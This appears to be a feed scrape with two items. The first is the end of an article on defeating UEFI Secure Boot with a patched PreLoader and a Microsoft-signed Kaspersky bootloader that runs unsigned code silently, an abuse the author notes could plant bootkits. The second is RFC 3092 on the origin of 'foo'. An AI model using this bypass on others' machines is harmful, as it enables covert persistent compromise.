All modern popular Linux distributions use shim due to certificate support, which makes it easy to provide updates for the main bootloader without the need for user interaction. In general, shim is used to run GRUB2 — the most popular bootloader in Linux.</p><h2>GRUB2</h2><p>To prevent signed bootloader abuse with malicious intentions, Red Hat created patches for GRUB2 that block «dangerous» functions when Secure Boot is enabled: insmod/rmmod, appleloader, linux (replaced by linuxefi), multiboot, xnu, memrw, iorw. The chainloader module, which loads arbitrary .efi-files, introduced its own custom internal .efi (PE) loader without using the UEFI LoadImage/StartImage functions, as well as the validation code of the loaded files via shim, in order to preserve the ability to load files trusted by shim but not trusted in terms of UEFI. It's not exactly clear why this method is preferable—UEFI allows one to redefine (hook) UEFI verification functions, this is how PreLoader works, and indeed the very <a href="https://github.com/rhboot/shim/blob/741c61abba7d5c74166f8d0c1b9ee8001ebcd186/lib/security_policy.c" rel="nofollow">shim feature is present</a> but disabled by default.</p><p>

Anyway, using the signed GRUB from some Linux distribution does not suit our needs. There are two ways to create a universal bootable flash drive that would not require adding the keys of each executable file to the trusted files:</p><ul>
<li>Use modded GRUB with internal EFI loader, without digital signature vertification or module restrictions;</li>
<li>Use custom pre-loader (the second one) which hook UEFI file vertification functions (EFI_SECURITY_ARCH_PROTOCOL.FileAuthenticationState, EFI_SECURITY2_ARCH_PROTOCOL.FileAuthentication)</li>
</ul><p>
The second method is preferable as executed software can load and start another software, for example, UEFI shell can execute any program. The first method does not provide this, allowing only GRUB to execute arbitrary files. Let's <a href="https://github.com/ValdikSS/Super-UEFIinSecureBoot-Disk/tree/master/efi-tools-patches" rel="nofollow">modify PreLoader</a> by removing all unnecessary features and patch verification code to allow everything.</p><p>

Disk architecture is as follows:</p><pre><code>   ______            ______                ______
  ╱│     │          ╱│     │              ╱│     │
 /_│     │    →    /_│     │      →      /_│     │
 │       │    →    │       │      →      │       │
 │  EFI  │    →    │  EFI  │      →      │  EFI  │
 │_______│         │_______│             │_______│

BOOTX64.efi        grubx64.efi        grubx64_real.efi

  (shim)      (FileAuthentication         (GRUB2)
                override)

    ↓↓↓                ↑
                       ↑
   ______              ↑
  ╱│     │             ║
 /_│     │             ║
 │       │  ═══════════╝
 │  EFI  │
 │_______│

MokManager.efi

(Key enrolling
 tool)</code></pre><p>

This is how </p><a href="https://github.com/ValdikSS/Super-UEFIinSecureBoot-Disk" rel="nofollow"><u>Super</u> UEFIinSecureBoot Disk</a><p> has been made.</p><blockquote>Super UEFIinSecureBoot Disk is a bootable image with GRUB2 bootloader designed to be used as a base for recovery USB flash drives.<p>

Key feature: disk is fully functional with UEFI Secure Boot mode activated. It can launch any operating system or .efi file, even with untrusted, invalid or missing signature.</p><p>

The disk could be used to run various Live Linux distributions, WinPE environment, network boot, without disabling Secure Boot mode in UEFI settings, which could be convenient for performing maintenance of someone else's PC and corporate laptops, for example, with UEFI settings locked with a password.</p><p>

The image contains 3 components: shim pre-loader from Fedora (signed with Microsoft key which is pre-installed in most motherboards and laptops), modified Linux Foundation PreLoader (disables digital signature verification of executed files), and modified GRUB2 loader.</p><p>

On the first boot it's necessary to select the certificate using MokManager (starts automatically), after that everything will work just as with Secure Boot disabled—GRUB loads any unsigned .efi file or Linux kernel, executed EFI programs can load any other untrusted executables or drivers.</p><p>

To demonstrate disk functions, the image contains Super Grub Disk (a set of scripts to search and execute OS even if the bootloader is broken), GRUB Live ISO Multiboot (a set of scripts to load Linux Live distros directly from ISO file), One File Linux (the kernel and initrd in a single file, for system recovery) and several UEFI utilities.</p><p>

The disk is also compatible with UEFI without Secure Boot and with older PCs with BIOS.</p></blockquote><h2>Signed bootloaders</h2><p>I was wondering is it possible to bypass first boot key enrollment through shim. Could there be some signed bootloader that allow you to do more than the authors expected?<br>
As it turned out—there are such loaders. One of them is used in <a href="https://support.kaspersky.com/viruses/krd18" rel="nofollow">Kaspersky Rescue Disk 18</a>—antivirus software boot disk. GRUB from the disk allows you to load modules (the insmod command), and module in GRUB is just an executable code. The pre-loader on the disk is a custom one.</p><p>

Of course, you can't just use GRUB from the disk to load untrusted code. It is necessary to modify the chainloader module so that GRUB does not use the UEFI LoadImage/StartImage functions, but instead self-loads the .efi file into memory, performs relocation, finds the entry point and jumps to it. Fortunately, almost all the necessary code is present in <a href="https://github.com/rhboot/grub2/tree/grub-2.02-sb" rel="nofollow">Red Hat GRUB Secure Boot repository</a>, the only problem—<abbr title="Portable Executable. File format used for .exe and .efi files.">PE</abbr> header parser is missing. GRUB gets parsed header from shim, in a response to a function call via a special protocol. This could be easily fixed by porting the appropriate code from the shim or PreLoader to GRUB.</p><p>

This is how </p><u>Silent</u><p> UEFIinSecureBoot Disk has been made. The final disk architecture looks as follows:</p><pre><code>   ______            ______                ______
  ╱│     │          ╱│     │              ╱│     │
 /_│     │         /_│     │      →      /_│     │
 │       │         │       │      →      │       │
 │  EFI  │         │  EFI  │      →      │  EFI  │
 │_______│         │_______│             │_______│

BOOTX64.efi        grubx64.efi        grubx64_real.efi

(Kaspersky     (FileAuthentication         (GRUB2)
  Loader)        override)

    ↓↓↓                ↑
                       ↑
   ______              ↑
  ╱│     │             ║
 /_│     │             ║
 │       │  ═══════════╝
 │  EFI  │
 │_______│

 fde_ld.efi + custom chain.mod

(Kaspersky GRUB2)</code></pre><h2>The end</h2><p>In this article we proved the existence of not enough reliable bootloaders signed by Microsoft key, which allows booting untrusted code in Secure Boot mode.<br>
Using signed Kaspersky Rescue Disk files, we achieved a silent boot of any untrusted .efi files with Secure Boot enabled, without the need to add a certificate to UEFI db or shim MOK.<br>
These files can be used both for good deeds (for booting from USB flash drives) and for evil ones (for installing bootkits without computer owner consent).<br>
I assume that Kaspersky bootloader signature certificate will not live long, and it will be added to <a href="https://uefi.org/revocationlistfile" rel="nofollow">global UEFI certificate revocation list</a>, which will be installed on computers running Windows 10 via Windows Update, breaking Kaspersky Rescue Disk 18 and Silent UEFIinSecureBoot Disk. Let's see how soon this would happen.</p><p>

Super UEFIinSecureBoot Disk download: <a href="https://github.com/ValdikSS/Super-UEFIinSecureBoot-Disk" rel="nofollow">https://github.com/ValdikSS/Super-UEFIinSecureBoot-Disk</a><br>
Silent UEFIinSecureBoot Disk download (<a href="https://zeronet.io/" rel="nofollow">ZeroNet Git Center</a> network): <a href="http://127.0.0.1:43110/1KVD7PxZVke1iq4DKb4LNwuiHS4UzEAdAv/" rel="nofollow">http://127.0.0.1:43110/1KVD7PxZVke1iq4DKb4LNwuiHS4UzEAdAv/</a></p><div><p><b>About ZeroNet</b></p><div><p>ZeroNet is a very powerful system for decentralized distributed dynamic web sites and services. The user starts downloading and seeding website data upon visiting it, following BitTorrent principle. But unlike other similar systems, ZeroNet allows creating full-fledged blogs with comments, forums, video hostings, wiki sites, chats, email and git.<br>
ZeroNet splits website data from website code: the data is stored in .json files and combined into sqlite databases with defined scheme, which allows to implement mind-bending features: local search in all opened websites in a meaning of milliseconds, all-site real-time RSS-like update stream.<br>
ZeroNet provides standardized authentication system similar to OAuth, NAT and Tor support.<br>
The system works really fast, is user-friendly, has modern user interface with small but convenient features like global night/day theme switch for all sites.</p><p>

I believe that ZeroNet is underrated and intentionally uploaded silent version of the disk only to ZeroNet Git, to attract new users.</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[RFC 3092 – Etymology of "Foo" (2001) (127 pts)]]></title>
            <link>https://datatracker.ietf.org/doc/html/rfc3092</link>
            <guid>46934499</guid>
            <pubDate>Sun, 08 Feb 2026 14:32:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://datatracker.ietf.org/doc/html/rfc3092">https://datatracker.ietf.org/doc/html/rfc3092</a>, See on <a href="https://news.ycombinator.com/item?id=46934499">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><pre>Network Working Group                                    D. Eastlake 3rd
Request for Comments: 3092                                      Motorola
Category: Informational                                        C. Manros
                                                                   Xerox
                                                              E. Raymond
                                                  Open Source Initiative
                                                            1 April 2001


                           <span>Etymology of "Foo"</span>

Status of this Memo

   This memo provides information for the Internet community.  It does
   not specify an Internet standard of any kind.  Distribution of this
   memo is unlimited.

Copyright Notice

   Copyright (C) The Internet Society (2001).  All Rights Reserved.

Abstract

   Approximately 212 RFCs so far, starting with <a href="https://datatracker.ietf.org/doc/html/rfc269">RFC 269</a>, contain the
   terms `foo', `bar', or `foobar' as metasyntactic variables without
   any proper explanation or definition.  This document rectifies that
   deficiency.

Table of Contents

   <a href="#section-1">1</a>. Introduction............................................<a href="#page-1">1</a>
   <a href="#section-2">2</a>. Definition and Etymology................................<a href="#page-2">2</a>
   <a href="#section-3">3</a>. Acronyms................................................<a href="#page-5">5</a>
   Appendix...................................................<a href="#page-7">7</a>
   Security Considerations...................................<a href="#page-11">11</a>
   References................................................<a href="#page-12">12</a>
   Authors' Addresses........................................<a href="#page-13">13</a>
   Full Copyright Statement..................................<a href="#page-14">14</a>

<span><a id="section-1" href="#section-1">1</a>. Introduction</span>

   Approximately 212 RFCs, or about 7% of RFCs issued so far, starting
   with [<a href="https://datatracker.ietf.org/doc/html/rfc269">RFC269</a>], contain the terms `foo', `bar', or `foobar' used as a
   metasyntactic variable without any proper explanation or definition.
   This may seem trivial, but a number of newcomers, especially if
   English is not their native language, have had problems in
   understanding the origin of those terms.  This document rectifies
   that deficiency.



<span>Eastlake, et al.             Informational                      [Page 1]</span></pre>
<hr><!--NewPage--><pre><span id="page-2"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   <a href="#section-2">Section 2</a> below describes the definition and etymology of these words
   and <a href="#section-3">Section 3</a> interprets them as acronyms.

   As an Appendix, we include a table of RFC occurrences of these words
   as metasyntactic variables.

<span><a id="section-2" href="#section-2">2</a>. Definition and Etymology</span>

   bar /bar/ n. [<a href="#ref-JARGON">JARGON</a>]

   1. The second metasyntactic variable, after foo and before baz.
      "Suppose we have two functions: FOO and BAR.  FOO calls BAR...."

   2. Often appended to foo to produce foobar.

   foo /foo/

   1. interj.  Term of disgust.

   2. Used very generally as a sample name for absolutely anything, esp.
      programs and files (esp. scratch files).

   3. First on the standard list of metasyntactic variables used in
      syntax examples (bar, baz, qux, quux, corge, grault, garply,
      waldo, fred, plugh, xyzzy, thud). [<a href="#ref-JARGON">JARGON</a>]

      When used in connection with `bar' it is generally traced to the
      WW II era Army slang acronym FUBAR (`Fucked Up Beyond All
      Repair'), later modified to foobar.  Early versions of the Jargon
      File [<a href="#ref-JARGON">JARGON</a>] interpreted this change as a post-war
      bowdlerization, but it now seems more likely that FUBAR was itself
      a derivative of `foo' perhaps influenced by German `furchtbar'
      (terrible) - `foobar' may actually have been the original form.

      For, it seems, the word `foo' itself had an immediate prewar
      history in comic strips and cartoons.  In the 1938 Warner Brothers
      cartoon directed by Robert Clampett, "The Daffy Doc", a very early
      version of Daffy Duck holds up a sign saying "SILENCE IS FOO!"
      `FOO' and `BAR' also occurred in Walt Kelly's "Pogo" strips.  The
      earliest documented uses were in the surrealist "Smokey Stover"
      comic strip by Bill Holman about a fireman.  This comic strip
      appeared in various American comics including "Everybody's"
      between about 1930 and 1952.  It frequently included the word
      "FOO" on license plates of cars, in nonsense sayings in the
      background of some frames such as "He who foos last foos best" or
      "Many smoke but foo men chew", and had Smokey say "Where there's
      foo, there's fire".  Bill Holman, the author of the strip, filled
      it with odd jokes and personal contrivances, including other



<span>Eastlake, et al.             Informational                      [Page 2]</span></pre>
<hr><!--NewPage--><pre><span id="page-3"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


      nonsense phrases such as "Notary Sojac" and "1506 nix nix".
      According to the Warner Brothers Cartoon Companion [<a href="#ref-WBCC">WBCC</a>] Holman
      claimed to have found the word "foo" on the bottom of a Chinese
      figurine.  This is plausible; Chinese statuettes often have
      apotropaic inscriptions, and this may have been the Chinese word
      `fu' (sometimes transliterated `foo'), which can mean "happiness"
      when spoken with the proper tone (the lion-dog guardians flanking
      the steps of many Chinese restaurants are properly called "fu
      dogs") [<a href="#ref-PERS">PERS</a>].  English speakers' reception of Holman's `foo'
      nonsense word was undoubtedly influenced by Yiddish `feh' and
      English `fooey' and `fool'. [<a href="#ref-JARGON">JARGON</a>, <a href="#ref-FOLDOC">FOLDOC</a>]

      Holman's strip featured a firetruck called the Foomobile that rode
      on two wheels.  The comic strip was tremendously popular in the
      late 1930s, and legend has it that a manufacturer in Indiana even
      produced an operable version of Holman's Foomobile.  According to
      the Encyclopedia of American Comics [<a href="#ref-EAC">EAC</a>], `Foo' fever swept the
      U.S., finding its way into popular songs and generating over 500
      `Foo Clubs.' The fad left `foo' references embedded in popular
      culture (including the couple of appearances in Warner Brothers
      cartoons of 1938-39) but with their origins rapidly forgotten.
      [<a href="#ref-JARGON">JARGON</a>]

      One place they are known to have remained live is in the U.S.
      military during the WWII years.  In 1944-45, the term `foo
      fighters' [<a href="#ref-FF">FF</a>] was in use by radar operators for the kind of
      mysterious or spurious trace that would later be called a UFO (the
      older term resurfaced in popular American usage in 1995 via the
      name of one of the better grunge-rock bands [<a href="#ref-BFF">BFF</a>]).  Informants
      connected the term to the Smokey Stover strip [<a href="#ref-PERS">PERS</a>].

      The U.S. and British militaries frequently swapped slang terms
      during the war.  Period sources reported that `FOO' became a
      semi-legendary subject of WWII British-army graffiti more or less
      equivalent to the American Kilroy [<a href="#ref-WORDS">WORDS</a>].  Where British troops
      went, the graffito "FOO was here" or something similar showed up.
      Several slang dictionaries aver that FOO probably came from
      Forward Observation Officer, but this (like the contemporaneous
      "FUBAR") was probably a backronym [<a href="#ref-JARGON">JARGON</a>].  Forty years later,
      Paul Dickson's excellent book "Words" [<a href="#ref-WORDS">WORDS</a>] traced "Foo" to an
      unspecified British naval magazine in 1946, quoting as follows:

         "Mr. Foo is a mysterious Second World War product, gifted with
         bitter omniscience and sarcasm."

      Earlier versions of the Jargon File suggested the possibility that
      hacker usage actually sprang from "FOO, Lampoons and Parody", the
      title of a comic book first issued in September 1958, a joint



<span>Eastlake, et al.             Informational                      [Page 3]</span></pre>
<hr><!--NewPage--><pre><span id="page-4"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


      project of Charles and Robert Crumb.  Though Robert Crumb (then in
      his mid-teens) later became one of the most important and
      influential artists in underground comics, this venture was hardly
      a success; indeed, the brothers later burned most of the existing
      copies in disgust.  The title FOO was featured in large letters on
      the front cover.  However, very few copies of this comic actually
      circulated, and students of Crumb's `oeuvre' have established that
      this title was a reference to the earlier Smokey Stover comics.
      The Crumbs may also have been influenced by a short-lived Canadian
      parody magazine named `Foo' published in 1951-52. [<a href="#ref-JARGON">JARGON</a>]

      An old-time member reports that in the 1959 "Dictionary of the
      TMRC Language", compiled at TMRC (the Tech Model Railroad Club at
      MIT) there was an entry for Foo.  The current on-line version, in
      which "Foo" is the only word coded to appear red, has the
      following [<a href="#ref-TMRC">TMRC</a>]:

         Foo:  The sacred syllable (FOO MANI PADME HUM); to be spoken
         only when under obligation to commune with the Deity. Our first
         obligation is to keep the Foo Counters turning.

      This definition used Bill Holman's nonsense word, then only two
      decades old and demonstrably still live in popular culture and
      slang, to make a "ha ha only serious" analogy with esoteric
      Tibetan Buddhism.  Today's hackers would find it difficult to
      resist elaborating a joke like that, and it is not likely 1959's
      were any less susceptible. [<a href="#ref-JARGON">JARGON</a>]

   4. [<a href="#ref-EF">EF</a>] Prince Foo was the last ruler of Pheebor and owner of the
      Phee Helm, about 400 years before the reign of Entharion.  When
      Foo was beheaded by someone he called an "eastern fop" from
      Borphee, the glorious age of Pheebor ended, and Borphee rose to
      the prominence it now enjoys.

   5. [<a href="#ref-OED">OED</a>] A 13th-16th century usage for the devil or any other enemy.
      The earliest citation it gives is from the year 1366, Chaucer A B
      C (84): "Lat not our alder foo [devil] make his bobance [boast]".
      Chaucer's "Foo" is probably related to modern English "foe".

   6. Rare species of dog.

      A spitz-type dog discovered to exist after having long been
      considered extinct, the Chinese Foo Dog, or Sacred Dog of
      Sinkiang, may have originated through a crossing of Northern
      European hunting dogs and the ancient Chow Chow from Mongolia or
      be the missing link between the Chinese Wolf and the Chow Chow.
      It probably derives its name from foochow, of the kind or style




<span>Eastlake, et al.             Informational                      [Page 4]</span></pre>
<hr><!--NewPage--><pre><span id="page-5"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


      prevalent in Foochow, of or from the city of Foochow (now Minhow)
      in southeast China. [<a href="#ref-DOG">DOG</a>]

   foobar n.

      [<a id="ref-JARGON">JARGON</a>] A widely used metasyntactic variable; see foo for
      etymology.  Probably originally propagated through DECsystem
      manuals by Digital Equipment Corporation (DEC) in 1960s and early
      1970s; confirmed sightings there go back to 1972.  Hackers do not
      generally use this to mean FUBAR in either the slang or jargon
      sense.  It has been plausibly suggested that "foobar" spread among
      early computer engineers partly because of FUBAR and partly
      because "foo bar" parses in electronics techspeak as an inverted
      foo signal.

   foo-fighter n.

      World War II term for Unidentified Flying Objects (UFOs) noted by
      both German and British military.  See [<a href="#ref-FF">FF</a>] and entry above for
      "foo".

<span><a id="section-3" href="#section-3">3</a>. Acronyms</span>

   The following information is derived primarily from the compilations
   at University Cork College &lt;<a href="http://www.ucc.ie/acronyms">http://www.ucc.ie/acronyms</a>&gt; and Acronym
   Finder &lt;<a href="http://www.acronymfinder.com/">http://www.AcronymFinder.com</a>&gt; generally filtered for computer
   usage.

   .bar:

      Generic file extension which is not meant to imply anything about
      the file type.

   BAR:

      Base Address Register

      Buffer Address Register

   FOO:

      Forward Observation Observer.

      FOO Of Oberlin.  An organization whose name is a recursive
      acronym.  Motto: The FOO, the Proud, the FOO.  See
      &lt;<a href="http://cs.oberlin.edu/students/jmankoff/FOO/home.html">http://cs.oberlin.edu/students/jmankoff/FOO/home.html</a>&gt;.

      File Open for Output.  An NFILE error code [<a href="https://datatracker.ietf.org/doc/html/rfc1037">RFC1037</a>].



<span>Eastlake, et al.             Informational                      [Page 5]</span></pre>
<hr><!--NewPage--><pre><span id="page-6"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   FOOBAR:

      FTP Operation Over Big Address Records [<a href="https://datatracker.ietf.org/doc/html/rfc1639">RFC1639</a>].  (Particularly
      appropriate given that the first RFC to use "foo", [<a href="https://datatracker.ietf.org/doc/html/rfc269">RFC269</a>], was
      also about file transfer.)

   FUBAR:

      Failed UniBus Address Register - in a VAX, from Digital Equipment
      Corporation Engineering.

      Fucked Up Beyond All Recognition/Repair - From US Military in
      World War II.  Sometimes sanitized to "Fouled Up ...".

   FUBARD - Past tense of FUBAR.




































<span>Eastlake, et al.             Informational                      [Page 6]</span></pre>
<hr><!--NewPage--><pre><span id="page-7"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


Appendix

   Below is a table of RFC occurrences of these words as metasyntactic
   variables.  (This excludes other uses that are reasonably clear like
   "vertical bar" or "bar BoF".)  Many of these uses are for example
   domain names.  That usage may decrease with the specification in [RFC
   2606] of a Best Current Practice for example domain names.

   +------+-----+-----+---------+-------+-----+
   | RFC# | bar | foo | foo.bar | fubar |  #  |
   |      |     |     | foobar  |       |     |
   +------+-----+-----+---------+-------+-----+
   |  269 |  X  |  X  |         |       |   1 |
   |  441 |  X  |  X  |         |       |   2 |
   |  614 |     |  X  |         |       |   3 |
   |  686 |     |  X  |         |       |   4 |
   |  691 |     |  X  |         |       |   5 |
   |  733 |  X  |  X  |         |       |   6 |
   |  742 |     |  X  |         |       |   7 |
   |  743 |  X  |  X  |         |       |   8 |
   |  756 |     |  X  |         |       |   9 |
   |  765 |  X  |  X  |         |       |  10 |
   |  772 |  X  |  X  |         |   X   |  11 |
   |  775 |     |     |    X    |       |  12 |
   |  780 |  X  |  X  |         |   X   |  13 |
   |  788 |  X  |  X  |         |       |  14 |
   |  810 |  X  |  X  |    X    |       |  15 |
   |  819 |     |  X  |         |       |  16 |
   |  821 |  X  |  X  |         |       |  17 |
   |  822 |  X  |  X  |         |       |  18 |
   |  882 |  X  |  X  |         |       |  19 |
   |  883 |     |  X  |         |       |  20 |
   |  897 |  X  |  X  |         |       |  21 |
   |  913 |     |  X  |         |       |  22 |
   |  921 |  X  |  X  |         |       |  23 |
   |  934 |     |  X  |         |       |  24 |
   |  952 |  X  |  X  |    X    |       |  25 |
   |  959 |     |     |    X    |       |  26 |
   |  976 |     |     |    X    |       |  27 |
   |  977 |     |  X  |    X    |       |  28 |
   |  987 |     |     |    X    |       |  29 |
   | 1013 |     |  X  |         |       |  30 |
   | 1033 |  X  |  X  |         |       |  31 |
   | 1035 |     |  X  |         |       |  32 |
   | 1037 |     |  X  |         |       |  33 |
   | 1056 |  X  |  X  |    X    |       |  34 |
   | 1068 |     |  X  |         |       |  35 |
   | 1137 |     |     |    X    |       |  36 |



<span>Eastlake, et al.             Informational                      [Page 7]</span></pre>
<hr><!--NewPage--><pre><span id="page-8"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   | 1138 |     |  X  |    X    |       |  37 |
   | 1148 |     |  X  |    X    |       |  38 |
   | 1173 |     |     |    X    |       |  39 |
   | 1176 |     |     |    X    |       |  40 |
   | 1186 |     |  X  |         |       |  41 |
   | 1194 |     |  X  |         |       |  42 |
   | 1196 |     |  X  |         |       |  43 |
   | 1203 |     |  X  |    X    |       |  44 |
   | 1288 |     |  X  |         |       |  45 |
   | 1291 |     |  X  |         |       |  46 |
   | 1309 |     |  X  |         |       |  47 |
   | 1327 |     |  X  |    X    |       |  48 |
   | 1341 |  X  |  X  |    X    |       |  49 |
   | 1343 |     |  X  |    X    |       |  50 |
   | 1344 |     |  X  |         |       |  51 |
   | 1348 |     |     |    X    |       |  52 |
   | 1386 |     |  X  |         |       |  53 |
   | 1408 |     |  X  |         |       |  54 |
   | 1411 |     |  X  |         |       |  55 |
   | 1412 |     |  X  |         |       |  56 |
   | 1459 |  X  |  X  |    X    |   X   |  57 |
   | 1480 |     |  X  |         |       |  58 |
   | 1505 |     |  X  |         |       |  59 |
   | 1519 |     |  X  |         |       |  60 |
   | 1521 |  X  |  X  |         |       |  61 |
   | 1523 |     |  X  |         |       |  62 |
   | 1524 |     |  X  |    X    |       |  63 |
   | 1526 |  X  |  X  |         |       |  64 |
   | 1535 |  X  |  X  |    X    |       |  65 |
   | 1536 |  X  |     |    X    |       |  66 |
   | 1537 |     |  X  |    X    |       |  67 |
   | 1563 |     |  X  |         |       |  68 |
   | 1564 |     |     |    X    |       |  69 |
   | 1572 |     |  X  |         |       |  70 |
   | 1573 |     |  X  |         |       |  71 |
   | 1622 |     |  X  |         |       |  72 |
   | 1635 |     |     |    X    |       |  73 |
   | 1636 |     |  X  |    X    |       |  74 |
   | 1642 |     |  X  |         |       |  75 |
   | 1645 |     |     |    X    |       |  76 |
   | 1649 |     |  X  |         |       |  77 |
   | 1664 |     |     |    X    |       |  78 |
   | 1681 |     |     |    X    |       |  79 |
   | 1697 |     |  X  |         |       |  80 |
   | 1716 |     |  X  |         |       |  81 |
   | 1718 |     |  X  |         |       |  82 |
   | 1730 |  X  |  X  |    X    |       |  83 |
   | 1734 |     |     |    X    |       |  84 |



<span>Eastlake, et al.             Informational                      [Page 8]</span></pre>
<hr><!--NewPage--><pre><span id="page-9"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   | 1738 |     |  X  |         |       |  85 |
   | 1783 |     |     |    X    |       |  86 |
   | 1784 |     |     |    X    |       |  87 |
   | 1786 |  X  |  X  |         |       |  88 |
   | 1813 |  X  |  X  |         |       |  89 |
   | 1835 |     |  X  |    X    |       |  90 |
   | 1856 |     |     |    X    |       |  91 |
   | 1861 |     |     |    X    |       |  92 |
   | 1866 |     |  X  |         |       |  93 |
   | 1894 |     |     |    X    |       |  94 |
   | 1896 |     |  X  |         |       |  95 |
   | 1898 |     |  X  |         |       |  96 |
   | 1913 |     |  X  |    X    |       |  97 |
   | 1945 |  X  |  X  |         |       |  98 |
   | 1985 |     |  X  |    X    |       |  99 |
   | 2015 |  X  |  X  |         |       | 100 |
   | 2017 |     |  X  |         |       | 101 |
   | 2033 |  X  |  X  |         |       | 102 |
   | 2045 |     |     |    X    |       | 103 |
   | 2046 |  X  |  X  |         |       | 104 |
   | 2049 |  X  |  X  |         |       | 105 |
   | 2055 |     |  X  |         |       | 106 |
   | 2060 |  X  |  X  |    X    |       | 107 |
   | 2065 |     |  X  |         |       | 108 |
   | 2068 |     |     |    X    |       | 109 |
   | 2071 |     |  X  |         |       | 110 |
   | 2088 |     |     |    X    |       | 111 |
   | 2109 |     |  X  |         |       | 112 |
   | 2110 |     |  X  |    X    |       | 113 |
   | 2111 |  X  |  X  |    X    |       | 114 |
   | 2141 |     |  X  |         |       | 115 |
   | 2150 |     |  X  |         |       | 116 |
   | 2152 |     |  X  |         |       | 117 |
   | 2156 |     |  X  |    X    |       | 118 |
   | 2163 |     |     |    X    |       | 119 |
   | 2167 |     |     |    X    |       | 120 |
   | 2168 |     |     |    X    |       | 121 |
   | 2169 |     |     |    X    |       | 122 |
   | 2180 |  X  |  X  |         |       | 123 |
   | 2193 |  X  |  X  |         |       | 124 |
   | 2224 |     |  X  |         |       | 125 |
   | 2227 |  X  |  X  |         |       | 126 |
   | 2233 |     |  X  |         |       | 127 |
   | 2234 |  X  |  X  |    X    |       | 128 |
   | 2243 |     |  X  |         |       | 129 |
   | 2255 |     |  X  |    X    |       | 130 |
   | 2280 |  X  |  X  |         |       | 131 |
   | 2295 |     |  X  |         |       | 132 |



<span>Eastlake, et al.             Informational                      [Page 9]</span></pre>
<hr><!--NewPage--><pre><span id="page-10"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   | 2302 |     |  X  |         |       | 133 |
   | 2311 |  X  |     |         |       | 134 |
   | 2326 |  X  |  X  |    X    |       | 135 |
   | 2342 |     |  X  |         |       | 136 |
   | 2348 |     |     |    X    |       | 137 |
   | 2349 |     |     |    X    |       | 138 |
   | 2359 |     |     |    X    |       | 139 |
   | 2369 |  X  |  X  |    X    |       | 140 |
   | 2378 |     |  X  |         |       | 141 |
   | 2384 |     |     |    X    |       | 142 |
   | 2392 |  X  |  X  |    X    |       | 143 |
   | 2396 |     |     |    X    |       | 144 |
   | 2401 |     |     |    X    |       | 145 |
   | 2407 |     |     |    X    |       | 146 |
   | 2421 |     |  X  |         |       | 147 |
   | 2425 |     |     |    X    |       | 148 |
   | 2434 |     |  X  |         |       | 149 |
   | 2446 |     |  X  |    X    |       | 150 |
   | 2447 |  X  |  X  |         |       | 151 |
   | 2458 |     |  X  |    X    |       | 152 |
   | 2459 |     |     |    X    |       | 153 |
   | 2476 |     |  X  |         |       | 154 |
   | 2483 |  X  |  X  |         |       | 155 |
   | 2486 |     |  X  |         |       | 156 |
   | 2505 |  X  |  X  |         |       | 157 |
   | 2518 |  X  |  X  |    X    |       | 158 |
   | 2535 |     |  X  |         |       | 159 |
   | 2538 |     |  X  |         |       | 160 |
   | 2543 |  X  |  X  |    X    |       | 161 |
   | 2554 |     |     |    X    |       | 162 |
   | 2557 |     |  X  |    X    |       | 163 |
   | 2565 |     |  X  |    X    |       | 164 |
   | 2569 |  X  |  X  |         |       | 165 |
   | 2593 |  X  |  X  |         |       | 166 |
   | 2595 |     |  X  |         |       | 167 |
   | 2608 |     |  X  |         |       | 168 |
   | 2609 |     |  X  |         |       | 169 |
   | 2616 |  X  |  X  |    X    |       | 170 |
   | 2622 |  X  |  X  |         |       | 171 |
   | 2626 |     |  X  |         |       | 172 |
   | 2633 |  X  |     |         |       | 173 |
   | 2640 |     |  X  |    X    |       | 174 |
   | 2645 |     |     |    X    |       | 175 |
   | 2650 |  X  |     |         |       | 176 |
   | 2659 |     |     |    X    |       | 177 |
   | 2673 |     |  X  |    X    |       | 178 |
   | 2693 |     |  X  |         |       | 179 |
   | 2704 |  X  |  X  |         |       | 180 |



<span>Eastlake, et al.             Informational                     [Page 10]</span></pre>
<hr><!--NewPage--><pre><span id="page-11"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc3092">RFC 3092</a>                   Etymology of "Foo"               1 April 2001</span>


   | 2705 |  X  |  X  |         |       | 181 |
   | 2717 |     |  X  |    X    |       | 182 |
   | 2725 |  X  |  X  |         |       | 183 |
   | 2731 |  X  |  X  |    X    |       | 184 |
   | 2732 |     |  X  |         |       | 185 |
   | 2782 |     |  X  |    X    |       | 186 |
   | 2803 |     |  X  |         |       | 187 |
   | 2806 |     |  X  |         |       | 188 |
   | 2812 |  X  |  X  |    X    |   X   | 189 |
   | 2818 |  X  |  X  |         |       | 190 |
   | 2828 |     |  X  |    X    |       | 191 |
   | 2830 |  X  |     |         |       | 192 |
   | 2831 |  X  |  X  |    X    |       | 193 |
   | 2839 |     |  X  |         |       | 194 |
   | 2846 |  X  |  X  |         |       | 195 |
   | 2853 |     |  X  |         |       | 196 |
   | 2863 |     |  X  |         |       | 197 |
   | 2910 |     |  X  |    X    |       | 198 |
   | 2912 |     |  X  |    X    |       | 199 |
   | 2915 |     |  X  |         |       | 200 |
   | 2926 |     |     |    X    |       | 201 |
   | 2942 |     |  X  |         |       | 202 |
   | 2965 |     |  X  |         |       | 203 |
   | 2967 |  X  |  X  |    X    |       | 204 |
   | 2970 |     |  X  |         |       | 205 |
   | 2993 |  X  |  X  |         |       | 206 |
